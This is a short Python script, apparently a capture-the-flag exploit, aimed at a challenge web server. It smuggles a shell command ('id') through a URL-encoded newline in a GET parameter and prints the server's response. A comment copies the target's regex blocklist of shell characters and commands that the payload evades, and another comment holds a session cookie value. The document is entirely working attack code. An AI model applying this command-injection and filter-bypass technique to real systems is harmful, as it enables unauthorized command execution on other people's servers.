import requests
from base64 import *

file1 = "\\\\"
file2 = " %0Aid%0A"
l = ""
for c in bytes(file2.encode()):
	l += '%'+	hex(c)[2:]
get_data = {
	'f1' : file1,
	'f2' : file2,
}
url = "http://final.kaibro.tw:10002"
# url = "http://localhost/index.php"
res = requests.get(url,params=get_data)
z = res.content.decode()
z = z[z.find('</code>')+7:]
print(z)
# /\'|\"|;|,|\`|\*|\\|\n|\t|\r|\xA0|\{|\}|\(|\)|<|\&[^\d]|@|\||ls|cat|sh|flag|find|grep|echo|w/is
# _ga=GA1.2.1486936008.1544290460; PHPSESSID=2smv2e0ftb454ng801v5tcuf8k